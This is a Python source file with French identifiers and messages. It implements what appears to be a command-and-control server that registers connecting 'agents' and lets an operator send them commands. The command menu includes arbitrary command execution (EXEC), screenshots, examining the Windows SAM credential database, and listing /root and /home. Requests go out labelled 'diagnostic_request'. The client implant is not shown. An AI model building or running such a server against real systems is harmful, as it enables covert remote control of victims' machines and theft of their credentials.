import socket
import json
import threading
from datetime import datetime
 
COMMANDES = {
    "HELP": "Afficher les commandes disponibles",
    "HOSTNAME": "Nom de la machine",
    "OS": "Systeme d'exploitation",
    "ARCH": "Architecture",
    "NETWORK": "Interfaces reseau",
    "INFO": "Toutes les informations",
    "STATUS": "Etat du client",
    "SCREENSHOT": "Capture d'ecran",
    "EXEC": "Executer une commande",
    "SAM": "Etude de la base SAM",
    "LIST": "Lister /root et /home"
}
 
def interpreter(commande):
    if not isinstance(commande, str) or not commande.strip():
        return {"statut": "refusee", "erreur": "Commande vide ou invalide"}
    parts = commande.strip().split(maxsplit=1)
    cmd = parts[0].upper()
    args = parts[1] if len(parts) > 1 else ""
    if cmd == "HELP":
        return {"statut": "ok", "commandes": COMMANDES}
    if cmd in COMMANDES:
        return {"statut": "autorisee", "commande": cmd, "args": args}
    return {"statut": "refusee", "erreur": "Commande inconnue"}
 
class AgentManager:
    def __init__(self):
        self.agents = {}
 
    def add_agent(self, agent_id, information):
        self.agents[agent_id] = information
        print(f"Agent {agent_id} enregistré.")
 
    def list_agents(self):
        return self.agents.copy()
 
    def remove_agent(self, agent_id):
        if agent_id in self.agents:
            del self.agents[agent_id]
            print(f"Agent {agent_id} supprimé.")
        else:
            print(f"Agent {agent_id} introuvable.")
 
HOST = "0.0.0.0"
PORT = 5000
manager = AgentManager()
agents_lock = threading.Lock()
def handle_client(client_socket, client_address):
    agent_id = None
    print(f"\nClient connecte : {client_address}")
    try:
        client_socket.settimeout(10)
        message = client_socket.recv(4096).decode("utf-8")
        information = json.loads(message)
        print("Informations recues :", information.get("hostname"))
        agent_id = f"{client_address[0]}:{client_address[1]}"
        agent_info = {
            "ip": client_address[0],
            "hostname": information.get("hostname", "inconnu"),
            "system": information.get("os", "inconnu"),
            "status": "connected",
            "connected_at": datetime.now().isoformat()
        }
        with agents_lock:
            manager.add_agent(agent_id, agent_info)
        reponse = {"status": "ok", "message": "Bien recu", "agent_id": agent_id}
        client_socket.sendall((json.dumps(reponse) + "\n").encode("utf-8"))
        fichier = client_socket.makefile("rwb")
        while True:
            commande = input(f"\n[{agent_id}] commande > ").strip()
            if commande.lower() in ("quit", "exit", ""):
                break   
 
            validation = interpreter(commande)
            if validation["statut"] == "refusee":
                print("Refusee :", validation["erreur"])
                continue
            if validation["statut"] == "ok":
                print("Commandes disponibles :")
                print(json.dumps(validation["commandes"], indent=4))
                continue
 
            demande = {
                "type": "diagnostic_request", 
                "commande": validation["commande"],
                "args": validation.get("args", "")
            }
            fichier.write((json.dumps(demande) + "\n").encode("utf-8"))
            fichier.flush()
 
            ligne = fichier.readline()
            if not ligne:
                print("Client deconnecte.")
                break
            try:
                reponse_client = json.loads(ligne.decode("utf-8"))
                print("Resultat :")
                print(json.dumps(reponse_client, indent=4))
            except json.JSONDecodeError:
                print("Erreur de decodage JSON.")
    except (json.JSONDecodeError, ValueError) as erreur:
        print("Erreur JSON :", erreur)
    except OSError as erreur:
        print("Erreur de communication :", erreur)
    finally:
        if agent_id is not None:
            with agents_lock:
                manager.remove_agent(agent_id)
        client_socket.close()
        print(f"Connexion terminee : {client_address}")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"Serveur en ecoute sur {HOST}:{PORT}")
 
        try:
            while True:
                client_socket, client_address = server_socket.accept()
                client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address), daemon=True)
                client_thread.start()
        except KeyboardInterrupt:
            print("\nArret du serveur.")
if __name__ == "__main__":
    main()